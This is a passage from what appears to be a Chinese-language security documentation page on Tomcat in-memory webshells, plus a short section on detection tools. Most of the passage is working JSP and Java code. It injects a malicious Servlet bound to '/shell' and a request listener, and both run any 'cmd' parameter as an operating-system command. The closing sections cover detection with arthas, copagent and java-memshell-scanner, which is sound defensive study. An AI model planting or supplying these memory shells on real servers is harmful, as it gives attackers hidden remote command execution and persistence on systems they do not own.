d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211123190816208" src="/assets/images/image-20211123190816208-7742be5637376a40ad8e7bc9f97e4002.png" width="1032" height="184" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="servlet内存马">Servlet内存马<a href="#servlet内存马" class="hash-link" aria-label="Servlet内存马的直接链接" title="Servlet内存马的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="启动">启动<a href="#启动" class="hash-link" aria-label="启动的直接链接" title="启动的直接链接">​</a></h4>
<p>常规情况下在启动时，会自动调用<code>StandardContext.addServletMappingDecoded()</code>方法给我们定义的路由和名字加进去，所有后面动态注入也是利用的这个方法，获取到<code>StandardContext</code>然后添加即可，前提是要给这个<code>servlet</code>先添加到<code>children</code>中</p>
<p><img decoding="async" loading="lazy" alt="image-20211124100859292" src="/assets/images/image-20211124100859292-e575e003993aad9adacc5fce3454201c.png" width="2510" height="1672" class="img_ev3q"></p>
<ul>
<li><code>servletMappings</code>和前提判断条件</li>
</ul>
<p><img decoding="async" loading="lazy" alt="image-20211124102229031" src="/assets/images/image-20211124102229031-fdd02be4077c3e8292c0da2d25922a7b.png" width="3584" height="2240" class="img_ev3q"></p>
<ul>
<li><code>findChild()</code></li>
</ul>
<p><img decoding="async" loading="lazy" alt="image-20211124101633003" src="/assets/images/image-20211124101633003-f5fce56c73176b1e1861fe46fdb1cab0.png" width="3584" height="2240" class="img_ev3q"></p>
<ul>
<li><code>addChild()</code></li>
</ul>
<p><img decoding="async" loading="lazy" alt="image-20211124102754954" src="/assets/images/image-20211124102754954-4f7c8a47554967706400c4e64a48ecd8.png" width="3584" height="2240" class="img_ev3q"></p>
<p>会给我们创建的<code>servlet/wrapper</code>添加到<code>children</code>中</p>
<p><img decoding="async" loading="lazy" alt="image-20211124102113072" src="/assets/images/image-20211124102113072-f74444d3c26b8a1b7406b5effc06f85b.png" width="3584" height="2240" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="动态注入内存-1">动态注入内存<a href="#动态注入内存-1" class="hash-link" aria-label="动态注入内存的直接链接" title="动态注入内存的直接链接">​</a></h4>
<p>下面的代码先是创建了一个恶意的<code>servlet</code>，然后获取当前的<code>StandardContext</code>，然后将恶意<code>servlet</code>封装成<code>wrapper</code>添加到<code>StandardContext</code>的<code>children</code>当中，最后添加<code>ServletMapping</code>将访问的<code>URL</code>和<code>wrapper</code>进行绑定。</p>
<div class="language-jsp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-jsp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 创建恶意Servlet</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Servlet servlet = new Servlet() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        public void init(ServletConfig servletConfig) throws ServletException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        public ServletConfig getServletConfig() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return null;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            String cmd = servletRequest.getParameter(&quot;cmd&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            boolean isLinux = true;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            String osTyp = System.getProperty(&quot;os.name&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                isLinux = false;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            String[] cmds = isLinux ? new String[]{&quot;sh&quot;, &quot;-c&quot;, cmd} : new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, cmd};</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Scanner s = new Scanner(in).useDelimiter(&quot;\\a&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            String output = s.hasNext() ? s.next() : &quot;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            PrintWriter out = servletResponse.getWriter();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            out.write(output);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            out.flush();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            out.close();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        public String getServletInfo() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return null;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        public void destroy() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    };</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">%&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 获取StandardContext</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 用Wrapper对其进行封装</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    newWrapper.setName(&quot;testsaaa&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    newWrapper.setLoadOnStartup(1);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    newWrapper.setServlet(servlet);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    newWrapper.setServletClass(servlet.getClass().getName());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 添加封装后的恶意Wrapper到StandardContext的children当中</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    standardCtx.addChild(newWrapper);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 添加ServletMapping将访问的URL和Servlet进行绑定</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	// 低版本此处可能为 addServletMapping</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    standardCtx.addServletMappingDecoded(&quot;/shell&quot;,&quot;testsaaa&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">%&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>执行上述代码后，访问当前应用的<code>/shell</code>路径，加上cmd参数就可以命令执行了。使用新增servlet的方式就需要绑定指定的URL。如果我们想要更加隐蔽，做到内存马与URL无关，无论这个url是原生servlet还是某个struts action，甚至无论这个url是否真的存在，只要我们的请求传递给tomcat，tomcat就能相应我们的指令，那就得通过注入新的或修改已有的filter或者listener的方式来实现了。</p>
<p>比如早期rebeyond师傅开发的memshell，就是通过修改<code>org.apache.catalina.core.ApplicationFilterChain</code>类的<code>internalDoFilter</code>方法来实现的，后期冰蝎最新版本的内存马为了实现更好的兼容性，选择hook <code>javax.servlet.http.HttpServlet#service</code> 函数，在weblogic选择hook <code>weblogic.servlet.internal.ServletStubImpl#execute</code> 函数。</p>
<p><img decoding="async" loading="lazy" alt="image-20211123140640054" src="/assets/images/image-20211123140640054-e38670ad82f4e39bb94e993d9eacd80a.png" width="1082" height="170" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="listener内存马">Listener内存马<a href="#listener内存马" class="hash-link" aria-label="Listener内存马的直接链接" title="Listener内存马的直接链接">​</a></h3>
<p>Listener的监听主要分为三类：</p>
<ul>
<li>ServletContext监听：用于对Servlet整个上下文进行监听（创建、销毁）</li>
<li>Session监听：对Session的整体状态的监听</li>
<li>Request监听：用于对Request请求进行监听（创建、销毁）</li>
</ul>
<p>对于这三类，熟悉java和Tomcat的同学应该知道，对于request的请求和篡改是常见的利用方式，另两者涉及到服务器的启动跟停止，或者是Session的建立跟销毁，就不太适合</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="servletrequestlistener接口">ServletRequestListener接口<a href="#servletrequestlistener接口" class="hash-link" aria-label="ServletRequestListener接口的直接链接" title="ServletRequestListener接口的直接链接">​</a></h4>
<p>该接口实现的方法有<code>requestDestroyed</code>，<code>requestInitialized</code>，分别是在监听request请求结束，以及request请求开始，我们着重看请求开始的部分</p>
<p><img decoding="async" loading="lazy" alt="image-20211123192336004" src="/assets/images/image-20211123192336004-b2895878b56824141dde7a41b8ee8c9b.png" width="1210" height="532" class="img_ev3q"></p>
<p>在<code>requestInitialized</code>这个函数中，我们从<code>servletRequestEvent</code>参数中取cmd参数，在当前上下文只要在任意路由下监听到了cmd参数存在值，那么就执行命令，具体操作如下</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">public void requestInitialized(ServletRequestEvent servletRequestEvent) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    String cmd = servletRequestEvent.getServletRequest().getParameter(&quot;cmd&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if(cmd != null){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        try {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Runtime.getRuntime().exec(cmd);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } catch (IOException e) {}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<blockquote>
<p>这里是没有回显的，盲的</p>
</blockquote>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="动态注入内存-2">动态注入内存<a href="#动态注入内存-2" class="hash-link" aria-label="动态注入内存的直接链接" title="动态注入内存的直接链接">​</a></h4>
<div class="language-jsp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-jsp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ServletRequestListener listener = new ServletRequestListener() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        public void requestInitialized(ServletRequestEvent sre) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            String cmd = sre.getServletRequest().getParameter(&quot;cmd&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if(cmd != null){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                try {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    Runtime.getRuntime().exec(cmd);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                } catch (IOException e) {}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    };</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">%&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;%</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 获取StandardContext</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    standardCtx.addApplicationEventListener(listener);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">%&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211123192949328" src="/assets/images/image-20211123192949328-bd63fe84146958066349d2fa9c855609.png" width="3582" height="1992" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="servlet-api总结">servlet-api总结<a href="#servlet-api总结" class="hash-link" aria-label="servlet-api总结的直接链接" title="servlet-api总结的直接链接">​</a></h2>
<p>以上三种根据Servlet的特性，动态注入，jsp文件只要落地，即可动态加载到内存中</p>
<table><thead><tr><th>姿势</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>Filter</td><td>通过添加全局拦截器对参数进行拦截，来进行恶意代码执行通过添加filtermap，可以随便设置路由，所有请求都会过该拦截器</td><td>引入<code>filterMaps</code>，<code>filterDef</code>，要根据tomcat版本来判断代码量较高</td></tr><tr><td>Servlet</td><td>简单方便，了解Servlet生命周期即可更直观了解如何动态添加ServletMapping</td><td>无法使所有参数都经过恶意代码，只能在我们自己设定的url中才能触发</td></tr><tr><td>Listener</td><td>简单方便，通过添加监听器对request进行监控在任意url中都能设置我们监听的参数</td><td>只要监听的参数含有就会进入监听代码中如果在该jsp页面下访问，则会重放请求</td></tr></tbody></table>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="内存马查杀">内存马查杀<a href="#内存马查杀" class="hash-link" aria-label="内存马查杀的直接链接" title="内存马查杀的直接链接">​</a></h2>
<p>查杀感觉很多都是依赖于<code>Java agent</code>去查杀的。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="arthas">arthas<a href="#arthas" class="hash-link" aria-label="arthas的直接链接" title="arthas的直接链接">​</a></h3>
<p><code>Arthas</code> 是Alibaba开源的Java诊断工具</p>
<ul>
<li>
<p>地址：<a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener noreferrer">https://github.com/alibaba/arthas</a></p>
</li>
<li>
<p><a href="https://github.com/alibaba/arthas/blob/master/README_CN.md" target="_blank" rel="noopener noreferrer">使用文档</a> 很详细，可以慢慢研究</p>
</li>
</ul>
<p>下载<code>arthas-boot.jar</code>，然后用<code>java -jar</code>的方式启动：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">curl</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-O</span><span class="token plain"> https://arthas.aliyun.com/arthas-boot.jar</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">java</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-jar</span><span class="token plain"> arthas-boot.jar</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211208134514442" src="/assets/images/image-20211208134514442-9f19bb09b4abfa4fb4a5a1772f5e26ff.png" width="2530" height="1428" class="img_ev3q"></p>
<ul>
<li>通过<code>mbean</code>命令，可以便捷的查看或监控 <strong>Mbean</strong> 的属性信息（可以查看异常<code>Filter</code>/<code>Servlet</code>节点）</li>
</ul>
<p><img decoding="async" loading="lazy" alt="image-20211208134927536" src="/assets/images/image-20211208134927536-df949fea855c02993684a91490d6b2d1.png" width="2100" height="356" class="img_ev3q"></p>
<ul>
<li>使用<code>jad</code>反编译class源码(感觉是依赖于<code>cfr-decompiler</code>这个小工具)</li>
</ul>
<p><img decoding="async" loading="lazy" alt="image-20211208135455680" src="/assets/images/image-20211208135455680-31cba5e974f5a5aad0f6b8e0f1c86953.png" width="2186" height="1506" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="copagent">copagent<a href="#copagent" class="hash-link" aria-label="copagent的直接链接" title="copagent的直接链接">​</a></h3>
<p>Java内存马提取工具，arthas的改进版，可以确定风险等级，并且将内存中的信息全部输出</p>
<p>地址：<a href="https://github.com/LandGrey/copagent" target="_blank" rel="noopener noreferrer">https://github.com/LandGrey/copagent</a></p>
<p>下载<code>cop.jar</code>，然后启动</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">wget</span><span class="token plain"> https://github.com/LandGrey/copagent/raw/release/cop.jar</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">java</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-jar</span><span class="token plain"> cop.jar</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211208140508288" src="/assets/images/image-20211208140508288-62ff781be6ef180860c4d02ad03098a4.png" width="1718" height="504" class="img_ev3q"></p>
<p>查看输出结果</p>
<p><img decoding="async" loading="lazy" alt="image-20211208140724649" src="/assets/images/image-20211208140724649-893717d63d95d9a3b9655a772ea65a11.png" width="1382" height="1056" class="img_ev3q"></p>
<p>找到相关的class文件并反编译</p>
<p><img decoding="async" loading="lazy" alt="image-20211208141523495" src="/assets/images/image-20211208141523495-ae3e897c646ad77ea0493ae132afb65c.png" width="3506" height="1914" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="java-memshell-scanner">java-memshell-scanner<a href="#java-memshell-scanner" class="hash-link" aria-label="java-memshell-scanner的直接链接" title="java-memshell-scanner的直接链接">​</a></h3>
<p>通过jsp脚本扫描并查杀各类中间件内存马，比Java agent要温和一些。</p>
<p>地址：<a href="https://github.com/c0ny1/java-memshell-scanner" target="_blank" rel="noopener noreferrer">https://github.com/c0ny1/java-memshell-scanner</a></p>
<p><img decoding="async" loading="lazy" alt="image-20211208141907949" src="/assets/images/image-20211208141907949-e91c7300d4d156bcfdbb78e42cb7bef8.png" width="3582" height="1386" class="img_ev3q"></p>
<p>dump下来反编译</p>
<p><img decoding="async" loading="lazy" alt="image-20211208142040825" src="/assets/images/image-20211208142040825-8018b06dc5ac3d57bbf48f9f422dfc86.png" width="3582" height="1606" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="参考">参考<a href="#参考" class="hash-link" aria-label="参考的直接链接" title="参考的直接链接">​</a></h2>
<ul>
<li><a href="https://mp.weixin.qq.com/s/T_6At4Crp1qmdczBSuLYdQ" target="_blank" rel="noopener noreferrer">Tomcat内存马</a></li>
<li><a href="http://uuzdaisuki.com/2021/06/29/tomcat%E6%97%A0%E6%96%87%E4%BB%B6%E5%86%85%E5%AD%98webshell/" target="_blank" rel="noopener noreferrer">tomcat无文件内存webshell</a></li>
<li><a href="https://www.anquanke.com/post/id/253386" target="_blank" rel="noopener noreferrer">Tomcat Filter类型内存马与查杀技术学习</a>：比较详细比较细，分析每一步为什么要这样做也很详细</li>
</ul></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/category/内存马"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">内存马</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/代码审计/Java安全/内存马/Spring内存马"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Spring内存马</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#内存马简介" class="table-of-contents__link toc-highlight">内存马简介</a><ul><li><a href="#什么是内存马" class="table-of-contents__link toc-highlight">什么是内存马</a></li><li><a href="#如何实现内存马" class="table-of-contents__link toc-highlight">如何实现内存马</a></li><li><a href="#内存马类型" class="table-of-contents__link toc-highlight">内存马类型</a></li></ul></li><li><a href="#背景知识" class="table-of-contents__link toc-highlight">背景知识</a><ul><li><a href="#java-web三大件" class="table-of-contents__link toc-highlight">Java web三大件</a><ul><li><a href="#servlet" class="table-of-contents__link toc-highlight">Servlet</a><ul><li><a href="#请求的处理过程" class="table-of-contents__link toc-highlight">请求的处理过程</a></li><li><a href="#servlet生命周期" class="table-of-contents__link toc-highlight">servlet生命周期</a></li><li><a href="#代码示例" class="table-of-contents__link toc-highlight">代码示例</a></li></ul></li><li><a href="#filter" class="table-of-contents__link toc-highlight">Filter</a><ul><li><a href="#基本工作原理" class="table-of-contents__link toc-highlight">基本工作原理</a></li><li><a href="#filter的生命周期" class="table-of-contents__link toc-highlight">filter的生命周期</a></li><li><a href="#filter链" class="table-of-contents__link toc-highlight">filter链</a></li><li><a href="#代码示例-1" class="table-of-contents__link toc-highlight">代码示例</a></li></ul></li><li><a href="#listener" class="table-of-contents__link toc-highlight">Listener</a><ul><li><a href="#代码示例-2" class="table-of-contents__link toc-highlight">代码示例</a></li></ul></li></ul></li><li><a href="#tomcat" class="table-of-contents__link toc-highlight">Tomcat</a><ul><li><a href="#tomcat架构设计" class="table-of-contents__link toc-highlight">Tomcat架构设计</a></li></ul></li><li><a href="#其他知识" class="table-of-contents__link toc-highlight">其他知识</a><ul><li><a href="#反射" class="table-of-contents__link toc-highlight">反射</a></li><li><a href="#java-instrumentation" class="table-of-contents__link toc-highlight">java instrumentation</a></li></ul></li></ul></li><li><a href="#servlet-api内存马编写" class="table-of-contents__link toc-highlight">servlet-api内存马编写</a><ul><li><a href="#filter内存马" class="table-of-contents__link toc-highlight">Filter内存马</a><ul><li><a href="#servletcontext" class="table-of-contents__link toc-highlight">ServletContext</a></li><li><a href="#applicationcontext" class="table-of-contents__link toc-highlight">ApplicationContext</a></li><li><a href="#filter相关变量" class="table-of-contents__link toc-highlight">Filter相关变量</a></li><li><a href="#动态注入内存" class="table-of-contents__link toc-highlight">动态注入内存</a></li></ul></li><li><a href="#servlet内存马" class="table-of-contents__link toc-highlight">Servlet内存马</a><ul><li><a href="#启动" class="table-of-contents__link toc-highlight">启动</a></li><li><a href="#动态注入内存-1" class="table-of-contents__link toc-highlight">动态注入内存</a></li></ul></li><li><a href="#listener内存马" class="table-of-contents__link toc-highlight">Listener内存马</a><ul><li><a href="#servletrequestlistener接口" class="table-of-contents__link toc-highlight">ServletRequestListener接口</a></li><li><a href="#动态注入内存-2" class="table-of-contents__link toc-highlight">动态注入内存</a></li></ul></li></ul></li><li><a href="#servlet-api总结" class="table-of-contents__link toc-highlight">servlet-api总结</a></li><li><a href="#内存马查杀" class="table-of-contents__link toc-highlight">内存马查杀</a><ul><li><a href="#arthas" class="table-of-contents__link toc-highlight">arthas</a></li><li><a href="#copagent" class="table-of-contents__link toc-highlight">copagent</a></li><li><a href="#java-memshell-scanner" class="table-of-contents__link toc-highlight">java-memshell-scanner</a></li></ul></li><li><a href="#参考" class="table-of-contents__link toc-highlight">参考</a></li></ul></div></div></div></div></main></div></div></div><footer class="footer 